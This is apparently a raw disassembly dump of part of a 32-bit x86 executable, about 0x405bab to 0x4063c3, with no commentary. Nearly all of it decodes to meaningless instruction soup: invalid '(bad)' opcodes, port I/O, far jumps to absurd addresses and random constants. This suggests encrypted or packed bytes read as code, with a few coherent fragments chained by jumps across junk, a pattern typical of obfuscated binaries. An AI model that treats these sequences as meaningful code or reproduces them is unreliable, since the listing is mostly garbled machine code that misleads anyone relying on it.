  405bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bac:	or     cl,BYTE PTR [ebp+esi*8+0x60]
  405bb0:	sub    DWORD PTR [esi+0x7e],edi
  405bb3:	push   ebp
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405c05
  405bb8:	push   ecx
  405bb9:	mov    ch,0xeb
  405bbb:	(bad)  
  405bbc:	jp     0x405bd3
  405bbe:	push   esi
  405bbf:	mov    bl,0xc6
  405bc1:	pushf  
  405bc2:	stos   BYTE PTR es:[edi],al
  405bc3:	(bad)
  405bc6:	xchg   edi,eax
  405bc7:	dec    edi
  405bc8:	ficomp DWORD PTR ds:0xc248b07d
  405bce:	out    dx,al
  405bcf:	inc    ecx
  405bd0:	push   ds
  405bd1:	mov    ebx,DWORD PTR [esi]
  405bd3:	mov    esi,0xbc9e44b3
  405bd8:	mov    DWORD PTR [eax+0x52],0xba19b86
  405bdf:	xchg   DWORD PTR [edx],ebp
  405be1:	push   es
  405be2:	stos   DWORD PTR es:[edi],eax
  405be3:	bnd jne 0x405c41
  405be6:	jno    0x405bf7
  405be8:	gs cmp ah,0xf2
  405bec:	repnz (bad) 
  405bef:	mov    ch,0xe9
  405bf1:	inc    edx
  405bf2:	mov    ebx,0x6d30507a
  405bf7:	retf   0x1606
  405bfa:	js     0x405c72
  405bfc:	or     eax,0xab0e3cdf
  405c01:	add    BYTE PTR ds:0xbbdf4943,dl
  405c07:	xor    eax,0x640fe543
  405c0c:	mov    DWORD PTR [edx],ebx
  405c0e:	retf   
  405c0f:	xor    al,0xf7
  405c11:	fdiv   st,st(6)
  405c13:	xor    eax,0x413c5f22
  405c18:	(bad)  
  405c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c1a:	dec    esi
  405c1b:	mov    al,0x33
  405c1d:	mov    ?,edx
  405c1f:	jbe    0x405c18
  405c21:	push   cs
  405c22:	rol    cl,1
  405c24:	ror    BYTE PTR [esi+ecx*4],1
  405c27:	imul   edi,edx,0xa277085b
  405c2d:	xor    eax,0xb8fe72db
  405c32:	jnp    0x405bc2
  405c34:	dec    esi
  405c35:	add    edx,ecx
  405c37:	sbb    eax,0xc9f55547
  405c3c:	mov    ecx,0x33c7298d
  405c41:	mov    eax,DWORD PTR [edx-0x1]
  405c44:	call   0x4595:0x83c65301
  405c4b:	push   0x7fda242f
  405c50:	xchg   edx,eax
  405c51:	and    eax,0x4d983228
  405c56:	mov    ebp,0x6c5eadae
  405c5c:	in     eax,0xbe
  405c5e:	imul   ebp,edx,0xffffffac
  405c61:	mov    ch,0x7a
  405c63:	dec    esp
  405c64:	and    eax,0xc3cec30c
  405c69:	sbb    DWORD PTR [edi+0x69],ecx
  405c6c:	jo     0x405c02
  405c6e:	cmp    edi,DWORD PTR [eax-0x65b42bcb]
  405c74:	jge    0x405c75
  405c76:	add    al,0x5d
  405c79:	push   0x61791899
  405c7e:	es out 0xef,eax
  405c81:	int3   
  405c82:	push   ds
  405c83:	(bad)  
  405c84:	fs inc eax
  405c86:	add    BYTE PTR [edi-0x52],bh
  405c89:	dec    ecx
  405c8a:	jae    0x405c7f
  405c8c:	add    esp,DWORD PTR [eax+0x4d]
  405c8f:	and    DWORD PTR [ecx+0x2dd2a84a],ebp
  405c95:	sar    al,0xb
  405c98:	lods   eax,DWORD PTR ds:[esi]
  405c99:	std    
  405c9a:	aam    0xbe
  405c9c:	cmp    al,0x11
  405c9e:	jle    0x405c5e
  405ca0:	jmp    0x2436d238
  405ca5:	repnz aaa 
  405ca7:	ficomp DWORD PTR [ebx-0x3d5a4b1f]
  405cad:	mov    ecx,0x400d9ecb
  405cb2:	adc    DWORD PTR [ecx+0x5e],eax
  405cb5:	dec    esp
  405cb6:	xchg   ebx,eax
  405cb7:	jp     0x405d1a
  405cb9:	sbb    al,0x2e
  405cbb:	cli    
  405cbc:	es pop ds
  405cbe:	(bad)  
  405cbf:	and    BYTE PTR [edi+0xd518793],dl
  405cc5:	jne    0x405cb2
  405cc7:	lods   eax,DWORD PTR ds:[esi]
  405cc8:	mov    ds:0xab43af9a,al
  405ccd:	nop
  405cce:	cmp    al,0xb5
  405cd0:	(bad)  
  405cd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cd2:	lock mov eax,ds:0x406afe18
  405cd8:	test   DWORD PTR [eax],esp
  405cda:	mov    esi,0x37a0bb18
  405cdf:	mov    BYTE PTR [edi+0x30b7d193],cl
  405ce5:	add    al,BYTE PTR [ecx-0x13]
  405ce8:	push   eax
  405ce9:	or     eax,0x215af183
  405cee:	cdq    
  405cef:	cs (bad) 
  405cf1:	and    al,BYTE PTR [ebx+0x4dc55c74]
  405cf7:	mov    dh,0x24
  405cf9:	and    al,0xac
  405cfb:	fnsave [edi-0x2b]
  405cfe:	jecxz  0x405cec
  405d00:	xchg   esp,eax
  405d01:	mov    ebx,0x42cfb6a4
  405d06:	jecxz  0x405d30
  405d08:	aaa    
  405d09:	xchg   ebx,eax
  405d0a:	dec    esi
  405d0b:	and    eax,0x6154889d
  405d10:	mov    cl,0xc3
  405d12:	aas    
  405d13:	sbb    ah,dl
  405d15:	push   ds
  405d16:	shl    DWORD PTR [ebx-0x4c],cl
  405d19:	sbb    eax,0x1de519cf
  405d1e:	int    0x53
  405d20:	inc    ebx
  405d21:	stos   DWORD PTR es:[edi],eax
  405d22:	call   0x62439b70
  405d27:	xchg   esp,eax
  405d28:	pushf  
  405d29:	xchg   ecx,esp
  405d2b:	cmp    BYTE PTR [esi-0x326a7fd0],dl
  405d31:	or     edx,edi
  405d33:	mov    edi,DWORD PTR [eax-0x79]
  405d36:	aaa    
  405d37:	and    ebx,edx
  405d39:	inc    edi
  405d3a:	add    al,BYTE PTR [esi+0x65]
  405d3d:	pusha  
  405d3e:	adc    ah,BYTE PTR [ebp+0x474cd991]
  405d44:	jmp    0x72ee6a3
  405d49:	ret    
  405d4a:	popa   
  405d4b:	rsm    
  405d4d:	jle    0x405d50
  405d4f:	clc    
  405d50:	jae    0x405dd0
  405d52:	nop
  405d53:	push   ss
  405d54:	cld    
  405d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d56:	pop    ds
  405d57:	hlt    
  405d58:	inc    ecx
  405d59:	fsub   QWORD PTR [esi-0x5]
  405d5c:	mov    fs,WORD PTR [ecx+0x2b4b14b0]
  405d62:	int    0xbf
  405d64:	or     cl,BYTE PTR [edx+0x42670bbb]
  405d6a:	(bad)  
  405d6c:	push   es
  405d6d:	push   eax
  405d6e:	sbb    ebx,DWORD PTR [edi]
  405d70:	lods   eax,DWORD PTR ds:[esi]
  405d71:	push   esp
  405d72:	push   cs
  405d73:	test   BYTE PTR ds:0xd7839893,cl
  405d79:	jnp    0x405deb
  405d7b:	xchg   esi,eax
  405d7c:	mov    ch,0x4d
  405d7e:	iretw  
  405d80:	sbb    al,0x82
  405d82:	mov    BYTE PTR ds:0xe030b1ae,ch
  405d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d89:	out    0xd2,al
  405d8b:	out    0xfe,al
  405d8d:	aad    0xb1
  405d8f:	lds    ebx,FWORD PTR [ecx+0x1c]
  405d92:	mov    eax,DWORD PTR [ebp-0x10]
  405d95:	mov    eax,DWORD PTR [eax+0x198]
  405d9b:	push   DWORD PTR [eax]
  405d9d:	call   0x40cdc5
  405da2:	mov    DWORD PTR [ebp-0x8],eax
  405da5:	cmp    DWORD PTR [ebp-0x8],0x0
  405da9:	lea    eax,[ebp+0x4]
  405dac:	jmp    0x405fa4
  405db1:	xchg   ebx,eax
  405db2:	leave  
  405db3:	ror    DWORD PTR [esi-0x2eae69af],1
  405db9:	mov    ds:0x109c135b,al
  405dbe:	adc    bl,BYTE PTR [eax+0x7e374731]
  405dc4:	jle    0x405e1b
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405e07
  405dca:	les    eax,FWORD PTR [edi+0x329b510]
  405dd0:	add    esp,DWORD PTR [edx+0x79ee267e]
  405dd6:	jecxz  0x405dfe
  405dd8:	inc    ebp
  405dd9:	pop    edi
  405dda:	in     al,0x43
  405ddc:	shr    DWORD PTR [ebp+ebp*1-0x7b68384b],0xc
  405de4:	mov    al,0x1d
  405de6:	pop    ecx
  405de7:	push   eax
  405de8:	inc    ebx
  405de9:	add    al,0x79
  405deb:	aaa    
  405dec:	std    
  405ded:	pop    eax
  405dee:	sbb    esi,edi
  405df0:	fucomip st,st(5)
  405df2:	cli    
  405df3:	adc    al,0xaa
  405df5:	lahf   
  405df6:	shl    BYTE PTR [edx+0x5cff7b9],1
  405dfc:	test   DWORD PTR [esi+eiz*4-0x556dfead],esp
  405e03:	push   esi
  405e04:	inc    esi
  405e05:	sub    BYTE PTR ds:0x84fd9c77,bh
  405e0b:	sub    ch,bl
  405e0d:	cmp    BYTE PTR [edi],bh
  405e0f:	ror    ebp,0xa5
  405e12:	jbe    0x405e6e
  405e14:	fs mov esi,0x56809dc
  405e1a:	sbb    ecx,DWORD PTR [ebp+0x30dbf4e8]
  405e20:	loope  0x405e98
  405e22:	into   
  405e23:	shl    DWORD PTR [edx-0x4f2f73ee],cl
  405e29:	mov    edi,0x2b34afea
  405e2e:	pop    es
  405e2f:	aam    0x8
  405e31:	sahf   
  405e32:	ret    
  405e33:	sahf   
  405e34:	xor    BYTE PTR [edx-0x35],bh
  405e37:	mov    esi,0x80ea20d3
  405e3c:	add    DWORD PTR [edx],esi
  405e3e:	sbb    DWORD PTR [esp+eax*2-0x63860323],0xbc007b37
  405e49:	dec    esi
  405e4a:	jmp    0xbf92:0x5d92b81b
  405e51:	dec    edx
  405e52:	jo     0x405df7
  405e54:	add    esi,esi
  405e56:	shl    DWORD PTR [ebx],0x36
  405e59:	pop    ss
  405e5a:	push   0xb6b915f2
  405e5f:	retf   0xf0a7
  405e62:	and    DWORD PTR [edx+0x6a0d1987],ebx
  405e68:	mov    edx,0x871052d6
  405e6d:	ror    DWORD PTR gs:[eax-0x76dc6a4],cl
  405e74:	ror    DWORD PTR [ebp+0x1e],1
  405e77:	or     BYTE PTR [eax-0xe],0x69
  405e7b:	ins    BYTE PTR es:[edi],dx
  405e7c:	xor    ebx,DWORD PTR [ebx]
  405e7e:	(bad)  
  405e7f:	sti    
  405e80:	sub    al,BYTE PTR [ecx+edx*8-0x14]
  405e84:	jl     0x405e40
  405e86:	cmc    
  405e87:	push   esi
  405e88:	mov    ah,0xc8
  405e8a:	push   ds
  405e8b:	popa   
  405e8c:	scas   eax,DWORD PTR es:[edi]
  405e8d:	mov    ds:0x2b56f223,al
  405e92:	or     al,ah
  405e94:	jnp    0x405e2d
  405e96:	out    dx,al
  405e97:	and    ecx,DWORD PTR [esi-0x7b]
  405e9a:	xor    esi,DWORD PTR [edx+0x7d]
  405e9d:	or     bh,BYTE PTR [eax]
  405e9f:	hlt    
  405ea0:	sahf   
  405ea1:	sahf   
  405ea2:	pop    ebx
  405ea3:	adc    bl,BYTE PTR [ecx-0x3926a7e2]
  405ea9:	rcl    BYTE PTR [bx+si],0x8d
  405ead:	shl    BYTE PTR ds:0xe53d86db,cl
  405eb3:	jo     0x405ec1
  405eb5:	into   
  405eb6:	clc    
  405eb7:	push   edx
  405eb8:	mov    DWORD PTR [edi],ebp
  405eba:	leave  
  405ebb:	or     dh,bh
  405ebd:	out    dx,eax
  405ebe:	xchg   DWORD PTR [ecx-0x5f],esp
  405ec1:	sub    eax,0xb4e1c470
  405ec6:	shr    BYTE PTR ss:[eax+0x29],1
  405eca:	test   al,0xf
  405ecc:	push   0xffffff8c
  405ece:	das    
  405ecf:	add    edi,edi
  405ed1:	mov    BYTE PTR ds:0x93a4f3ef,ch
  405ed7:	pop    ebp
  405ed8:	fs rcr BYTE PTR gs:[edx+0x3c1e6fc7],0x13
  405ee1:	fsub   QWORD PTR [ebp+0x57479034]
  405ee7:	inc    edi
  405ee8:	sbb    al,0x61
  405eea:	bound  edi,QWORD PTR [ebx-0x365d272f]
  405ef0:	jecxz  0x405ee3
  405ef2:	test   eax,0x32db508e
  405ef7:	jb     0x405f36
  405ef9:	adc    eax,0xb2dc528c
  405efe:	rep stos BYTE PTR es:[edi],al
  405f00:	std    
  405f01:	fwait
  405f02:	add    eax,0x703641de
  405f07:	pusha  
  405f08:	test   BYTE PTR [edx],bh
  405f0a:	cmp    ebx,DWORD PTR [eax-0x1155f7b9]
  405f10:	dec    esp
  405f11:	xchg   ecx,eax
  405f12:	fisubr DWORD PTR [ecx]
  405f14:	out    0x89,eax
  405f16:	mov    edx,0x6db2257e
  405f1b:	add    BYTE PTR [edi+0x65672934],cl
  405f21:	pop    eax
  405f22:	jmp    0xff69:0x5d270854
  405f29:	jns    0x405f01
  405f2b:	mov    ?,WORD PTR gs:[edx]
  405f2e:	or     ecx,ebp
  405f30:	push   esi
  405f31:	pop    edi
  405f32:	jmp    0x4c08874c
  405f37:	lods   al,BYTE PTR ds:[esi]
  405f38:	jns    0x405fa8
  405f3a:	xchg   esi,eax
  405f3b:	adc    eax,0xa19e1ada
  405f40:	mov    ds:0x6b6f6502,al
  405f45:	sar    BYTE PTR es:[esp+ecx*4],cl
  405f49:	xchg   esi,eax
  405f4a:	popa   
  405f4b:	jle    0x405f8b
  405f4d:	dec    eax
  405f4e:	jg     0x405f88
  405f50:	ret    
  405f51:	mov    al,BYTE PTR [edx-0x12]
  405f54:	mov    al,0x81
  405f56:	sub    DWORD PTR [eax-0x41],ecx
  405f59:	dec    esi
  405f5a:	por    mm1,mm4
  405f5d:	jbe    0x405f89
  405f5f:	mov    bl,0x1c
  405f61:	and    DWORD PTR [edi],ebp
  405f63:	cmp    bl,bh
  405f65:	add    eax,0x6f4ca07c
  405f6a:	enter  0x9068,0x73
  405f6e:	bound  ebx,QWORD PTR [eax+0x6fa973a3]
  405f74:	xor    bl,BYTE PTR [edi-0x6d]
  405f77:	inc    edi
  405f78:	test   ah,ah
  405f7a:	cli    
  405f7b:	mov    esi,esi
  405f7d:	xor    eax,0xffdf233e
  405f82:	lds    esp,FWORD PTR [ebx-0x80]
  405f85:	jle    0x405f6c
  405f87:	enter  0x55b8,0xd6
  405f8b:	sub    eax,0x122a6246
  405f90:	xor    eax,0xcc4a8fdd
  405f95:	imul   esp,ebp,0xef80ef29
  405f9b:	or     DWORD PTR [eax-0x6b594c91],0x35
  405fa2:	and    BYTE PTR gs:[ecx-0x7bf01fbb],cl
  405fa9:	xchg   esi,eax
  405faa:	or     al,BYTE PTR [eax]
  405fac:	add    cl,ch
  405fae:	repz add DWORD PTR [eax],eax
  405fb1:	add    bl,ch
  405fb3:	hlt    
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx-0x28]
  405fbf:	test   dh,al
  405fc1:	xor    BYTE PTR [edx+0x557e7e35],bl
  405fc7:	jg     0x406047
  405fc9:	jle    0x405fd2
  405fcb:	push   ecx
  405fcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fcd:	push   esp
  405fce:	xchg   ebp,eax
  405fcf:	outs   dx,DWORD PTR ds:[esi]
  405fd0:	iret   
  405fd1:	pop    edi
  405fd2:	pop    ebp
  405fd3:	in     al,0xc6
  405fd5:	ins    DWORD PTR es:[edi],dx
  405fd6:	fs repz mov ebx,0x48e241e7
  405fdd:	mov    ah,0x82
  405fdf:	retf   0xf63b
  405fe2:	dec    esp
  405fe3:	add    BYTE PTR [ebp+0x4f],dh
  405fe6:	or     BYTE PTR [edi-0x31],dl
  405fe9:	add    DWORD PTR [ebx],esp
  405feb:	ins    DWORD PTR es:[edi],dx
  405fec:	test   DWORD PTR [ebx],0x84f70ab0
  405ff2:	push   edx
  405ff3:	cmp    DWORD PTR [edx+0x7f85130f],esi
  405ff9:	push   ss
  405ffa:	adc    BYTE PTR [eax+0x41772806],ah
  406000:	sbb    ebp,DWORD PTR [edx-0x3305e486]
  406006:	push   ebx
  406007:	(bad)  
  406008:	adc    cl,bl
  40600a:	andps  xmm2,xmm6
  40600d:	les    edx,FWORD PTR [ebx]
  40600f:	push   0xffffff98
  406011:	mov    edi,edx
  406013:	out    dx,eax
  406014:	ret    
  406015:	lahf   
  406016:	jo     0x405f9e
  406018:	inc    eax
  406019:	cli    
  40601a:	and    dh,ch
  40601c:	cmp    al,ah
  40601e:	push   ebx
  40601f:	mov    esp,0xa5a79888
  406024:	out    dx,eax
  406025:	cmp    edi,ebx
  406027:	push   edi
  406028:	and    DWORD PTR [ebx*8+0x252b4398],ebp
  40602f:	in     al,0xbf
  406031:	add    BYTE PTR [edi+0x788a691e],0x9b
  406038:	addr16 enter 0x4d03,0x53
  40603d:	mov    dl,0xb9
  40603f:	inc    ebp
  406040:	mov    esi,0x25d0ac5
  406045:	es xor edx,eax
  406048:	cmp    DWORD PTR [ebx],esi
  40604a:	into   
  40604b:	xor    eax,0xd477b6c3
  406050:	ss icebp 
  406052:	jle    0x40601e
  406054:	cmp    DWORD PTR [ebp+0x470ef83a],esp
  40605a:	pop    ds
  40605b:	hlt    
  40605c:	aad    0x8f
  40605e:	in     al,dx
  40605f:	cmp    dl,al
  406061:	mov    edi,0xa6c0d134
  406066:	xchg   esp,eax
  406067:	repnz or dl,BYTE PTR gs:[ebp-0x32]
  40606c:	leave  
  40606d:	or     eax,0x99355767
  406072:	xchg   esi,eax
  406073:	imul   ecx,DWORD PTR [edx+edx*2],0xffffffd2
  406077:	stos   BYTE PTR es:[edi],al
  406078:	ss jo  0x406075
  40607b:	push   ebx
  40607c:	and    al,dl
  40607e:	dec    edi
  40607f:	push   es
  406080:	in     eax,0xf6
  406082:	xchg   edi,eax
  406083:	sbb    DWORD PTR [edi-0x2f409d3f],0x1e
  40608a:	xchg   esp,eax
  40608b:	jg     0x4060cc
  40608d:	popf   
  40608e:	push   esi
  40608f:	jl     0x406027
  406091:	out    0x62,al
  406093:	pop    ecx
  406094:	(bad)  
  406095:	fwait
  406096:	mov    edi,0xc635795b
  40609b:	jg     0x40609b
  40609d:	mov    al,0x10
  40609f:	pop    es
  4060a0:	call   0x8bba:0x1c9061db
  4060a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060a8:	sub    DWORD PTR [edi],eax
  4060aa:	xlat   BYTE PTR ds:[ebx]
  4060ab:	es xchg edi,eax
  4060ad:	shl    bl,cl
  4060af:	ja     0x406121
  4060b1:	or     eax,DWORD PTR [esi-0x73629a03]
  4060b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060b8:	push   ss
  4060b9:	int    0x88
  4060bb:	mov    ds:0xd8df0720,eax
  4060c0:	in     eax,0x27
  4060c2:	test   DWORD PTR [ebp+0x3e],0x8c6d6c89
  4060c9:	xchg   edi,eax
  4060ca:	shl    cl,1
  4060cc:	inc    ecx
  4060cd:	leave  
  4060ce:	test   eax,0xf6227d43
  4060d3:	dec    eax
  4060d4:	or     ebp,eax
  4060d6:	and    eax,0x743e6c44
  4060db:	mov    edi,0x608a212
  4060e0:	imul   ebp,DWORD PTR [edx],0xffffff8a
  4060e3:	jmp    0x4060b6
  4060e5:	xor    al,0x9f
  4060e7:	fs je  0x4060da
  4060ea:	sti    
  4060eb:	sub    al,0x5d
  4060ed:	or     ebx,esi
  4060ef:	fldcw  WORD PTR [eax]
  4060f1:	lock mov edx,0xbda565d5
  4060f7:	scas   eax,DWORD PTR es:[edi]
  4060f8:	scas   eax,DWORD PTR es:[edi]
  4060f9:	xchg   BYTE PTR [ebx],al
  4060fb:	pop    ebx
  4060fc:	or     bh,dh
  4060fe:	in     al,0x31
  406100:	test   eax,0x533e5b83
  406105:	jecxz  0x4060c8
  406107:	jp     0x4060a3
  406109:	dec    esp
  40610a:	test   eax,0xd530ec1a
  40610f:	pusha  
  406110:	push   ss
  406111:	jno    0x406106
  406113:	addr16 xor ecx,ebp
  406116:	jmp    0xac5:0xa834c320
  40611d:	call   FWORD PTR [eax-0x53]
  406120:	shr    DWORD PTR [ecx],0xf2
  406123:	imul   edx,edx,0x0
  406126:	test   al,0xe8
  406128:	sub    dl,BYTE PTR ss:[esi-0x24686b3a]
  40612f:	jmp    0x60118b56
  406134:	repnz loope 0x4061ab
  406137:	inc    ecx
  406138:	mov    DWORD PTR [ebp+0x6d],ecx
  40613b:	adc    eax,0xd8d839f2
  406141:	pop    eax
  406142:	and    dl,0xca
  406145:	push   eax
  406146:	retf   0x1f24
  406149:	cmp    eax,0x5b15cd87
  40614e:	mov    ecx,0xbe72217a
  406153:	sub    ecx,eax
  406155:	in     eax,dx
  406156:	push   edx
  406157:	lahf   
  406158:	in     al,dx
  406159:	cld    
  40615a:	xchg   ebx,eax
  40615b:	inc    ebx
  40615c:	cdq    
  40615d:	push   eax
  40615e:	arpl   si,di
  406160:	sahf   
  406161:	or     al,ah
  406163:	fimul  WORD PTR [ebx+0x62f9022c]
  406169:	fwait
  40616a:	(bad)  
  40616b:	js     0x406159
  40616d:	pop    edx
  40616e:	lea    ecx,[edi-0x13b5e727]
  406174:	mov    esi,0x517a398c
  406179:	out    dx,al
  40617a:	cmp    DWORD PTR [edx+0x79],ecx
  40617d:	mov    ah,ah
  40617f:	inc    ecx
  406180:	inc    ebp
  406181:	dec    ebp
  406182:	cmp    BYTE PTR [eax+0x59],bh
  406185:	and    eax,0x141e2433
  40618a:	outs   dx,BYTE PTR ds:[esi]
  40618b:	jb     0x406119
  40618d:	add    eax,DWORD PTR [ecx-0x24]
  406190:	bound  ecx,QWORD PTR ds:0x975dc55e
  406196:	xchg   edx,eax
  406197:	ins    BYTE PTR es:[edi],dx
  406198:	in     al,0x19
  40619a:	fistp  QWORD PTR [ecx]
  40619c:	adc    eax,0x643ed6b4
  4061a1:	jmp    0x4061e4
  4061a3:	sub    BYTE PTR [ecx-0x73],0x45
  4061a7:	call   0xd485ecfc
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	and    al,0xaa
  4061d3:	push   ds
  4061d4:	loopne 0x4061c7
  4061d6:	xor    edi,DWORD PTR [esi+0x7e]
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x406253
  4061de:	mov    ch,0xa8
  4061e0:	test   DWORD PTR fs:[ebx+0x36ea6a9e],0x8a9301a0
  4061eb:	or     al,0x53
  4061ed:	xlat   BYTE PTR ds:[ebx]
  4061ee:	ins    BYTE PTR es:[edi],dx
  4061ef:	and    eax,DWORD PTR [edi]
  4061f1:	xchg   ecx,eax
  4061f2:	mov    DWORD PTR [ebp+0x15],esp
  4061f5:	mov    ds:0x656be03f,al
  4061fa:	out    0xcd,al
  4061fc:	jp     0x40627d
  4061fe:	stc    
  4061ff:	iret   
  406200:	push   0x91bba3b2
  406205:	leave  
  406206:	add    DWORD PTR [edi-0x4c],0x2a82cd8b
  40620d:	stc    
  40620e:	jle    0x4061ef
  406210:	scas   eax,DWORD PTR es:[edi]
  406211:	ins    DWORD PTR es:[edi],dx
  406212:	test   BYTE PTR [eax],al
  406214:	cdq    
  406215:	xor    BYTE PTR [edx-0x149acbec],dh
  40621b:	xor    ah,BYTE PTR [edx+0x45]
  40621e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40621f:	push   esi
  406220:	mov    ebx,0x8bfa0df3
  406225:	lods   al,BYTE PTR ds:[esi]
  406226:	test   al,0x58
  406228:	jmp    0x223b623f
  40622d:	sar    DWORD PTR [eax],0x8b
  406230:	js     0x4061f3
  406232:	test   eax,eax
  406234:	test   al,0x5b
  406236:	movq   mm0,QWORD PTR [esi+0x19aab5df]
  40623d:	dec    edi
  40623e:	(bad)  
  40623f:	push   0x64
  406241:	jo     0x4061ea
  406243:	jecxz  0x406215
  406245:	jns    0x4061fa
  406247:	stos   BYTE PTR es:[edi],al
  406248:	inc    ebx
  406249:	adc    eax,esi
  40624b:	mov    ebp,0xa84043d3
  406250:	ds inc ebx
  406252:	out    0xe3,al
  406254:	ins    DWORD PTR es:[edi],dx
  406255:	push   edi
  406256:	loop   0x40620f
  406258:	sub    al,0x27
  40625a:	out    0x18,al
  40625c:	fs and al,0x61
  40625f:	rol    eax,0xb0
  406262:	ins    DWORD PTR es:[edi],dx
  406263:	stos   DWORD PTR es:[edi],eax
  406264:	mov    esp,0x9f846dd0
  406269:	aaa    
  40626a:	lods   al,BYTE PTR ds:[esi]
  40626b:	std    
  40626c:	mov    bh,0x11
  40626e:	adc    al,0x7c
  406270:	mov    ebp,0xb3be9a2c
  406275:	dec    esp
  406276:	xchg   esi,eax
  406277:	repz and eax,0x6fb51f38
  40627d:	dec    esp
  40627e:	dec    esi
  40627f:	and    edi,DWORD PTR ds:0x892469a4
  406285:	ins    BYTE PTR es:[edi],dx
  406286:	in     al,dx
  406287:	popa   
  406288:	add    al,0x8a
  40628a:	mov    eax,ds:0x56976622
  40628f:	push   0x78
  406291:	loopne 0x4062e4
  406293:	in     al,dx
  406294:	test   DWORD PTR [edi+0xd8f9136],0xb680dd29
  40629e:	test   al,0x61
  4062a0:	(bad)
  4062a3:	gs sbb al,0xc3
  4062a6:	call   FWORD PTR [ecx]
  4062a8:	leave  
  4062a9:	cld    
  4062aa:	sbb    al,BYTE PTR [edi+0x5f]
  4062ad:	mov    dl,0xc8
  4062af:	int3   
  4062b0:	rcr    DWORD PTR [edi+edx*4-0x4eaf91d2],cl
  4062b7:	(bad)  
  4062b8:	pop    edx
  4062b9:	rol    esi,0x93
  4062bc:	pop    edi
  4062bd:	pop    esi
  4062be:	push   ds
  4062bf:	and    eax,0xd0fe9fca
  4062c4:	lea    ecx,[edi+0x4c]
  4062c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062c8:	daa    
  4062c9:	push   0xbaa71a5e
  4062ce:	dec    ecx
  4062cf:	or     BYTE PTR [edi],ch
  4062d1:	retf   
  4062d2:	daa    
  4062d3:	xchg   ecx,eax
  4062d4:	dec    edi
  4062d5:	pop    ecx
  4062d6:	xchg   edx,eax
  4062d7:	ja     0x4062aa
  4062d9:	dec    ecx
  4062da:	repnz inc esi
  4062dc:	cwde   
  4062dd:	push   ebp
  4062de:	cmp    ebx,DWORD PTR [ebp+0x5caa3bae]
  4062e4:	imul   esp,DWORD PTR [esi-0xed1b6a9],0x785907a3
  4062ee:	bound  edi,QWORD PTR [esi+ebx*1]
  4062f1:	mov    bh,0x6e
  4062f3:	mov    ch,0x6
  4062f5:	fisubr DWORD PTR [esi]
  4062f7:	xchg   BYTE PTR [eax],dl
  4062f9:	or     eax,0x6c13a140
  4062fe:	inc    ebx
  4062ff:	clc    
  406300:	xlat   BYTE PTR ds:[ebx]
  406301:	push   ss
  406302:	lea    edi,[di+0x56]
  406306:	(bad)  
  406307:	fnstsw WORD PTR [ebp-0x5bf52078]
  40630d:	lea    edi,[eax]
  40630f:	lods   al,BYTE PTR ds:[esi]
  406310:	jmp    0xa362a1eb
  406315:	xchg   ebx,eax
  406316:	je     0x40635e
  406318:	(bad)  
  406319:	hlt    
  40631a:	daa    
  40631b:	pop    ebx
  40631c:	not    BYTE PTR [ecx]
  40631e:	mov    cl,0xc0
  406320:	sub    eax,0xf007f31f
  406325:	mov    ds:0xd2c8a25d,eax
  40632a:	xor    eax,0xffffffd5
  40632d:	jmp    0x5c88baeb
  406332:	mov    esi,0x836052ed
  406337:	push   ecx
  406338:	pop    edi
  406339:	mov    esp,0xfd23baa8
  40633e:	out    0x3c,ax
  406341:	dec    ebp
  406342:	dec    ebp
  406343:	pop    ecx
  406344:	call   0x7882a86e
  406349:	dec    esp
  40634a:	xchg   ecx,eax
  40634b:	stc    
  40634c:	shl    BYTE PTR [eax-0x40],0x2f
  406350:	and    al,0x9e
  406352:	ss (bad) 
  406354:	sub    eax,0xdae11c0a
  406359:	mov    BYTE PTR [edi+0x4526b0fe],bl
  40635f:	mov    ecx,0x54008885
  406364:	popa   
  406365:	mov    dl,0x1b
  406367:	push   es
  406368:	xchg   DWORD PTR [edi-0xfb6083b],edi
  40636e:	sbb    bh,BYTE PTR ds:0x713c91f
  406374:	mov    ch,cl
  406376:	scas   al,BYTE PTR es:[edi]
  406377:	in     al,0x50
  406379:	shl    BYTE PTR [edi-0x2178c0e4],cl
  40637f:	cmp    ch,BYTE PTR [edx]
  406381:	fs int3 
  406383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406384:	(bad)  
  406385:	and    bl,cl
  406387:	test   dl,0x11
  40638a:	out    dx,eax
  40638b:	mov    ds:0x92a5c5f1,eax
  406390:	sbb    BYTE PTR [ebx-0x21bfe78b],cl
  406396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406397:	repnz call 0xf8c5:0xfb42bae1
  40639f:	aas    
  4063a0:	xchg   edi,eax
  4063a1:	dec    ecx
  4063a2:	scas   al,BYTE PTR es:[edi]
  4063a3:	push   ss
  4063a4:	xchg   edx,eax
  4063a5:	jmp    0x56cb0034
  4063aa:	or     bl,BYTE PTR [ebx+eax*4]
  4063ad:	mov    ah,0x76
  4063af:	retf   0x7ff2
  4063b2:	in     al,0x95
  4063b4:	add    DWORD PTR [edx+ecx*4],0xf475ffe5
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
